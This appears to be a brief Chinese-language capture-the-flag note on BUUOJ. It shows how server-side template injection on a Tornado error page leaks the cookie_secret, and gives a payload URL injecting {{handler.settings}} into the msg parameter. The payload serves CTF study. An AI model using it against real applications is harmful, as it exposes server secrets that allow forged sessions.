---
created: 2024-01-29T11:51
updated: 2024-01-29T11:52
---
###### 获取cookie_seret
通过模板注入方式我们可以构造**获取cookie_secret的payload：**

http://0ae71843-3ebf-4a5e-a920-b9bd77b4d13f.node4.buuoj.cn:81/error?msg={{handler.settings}}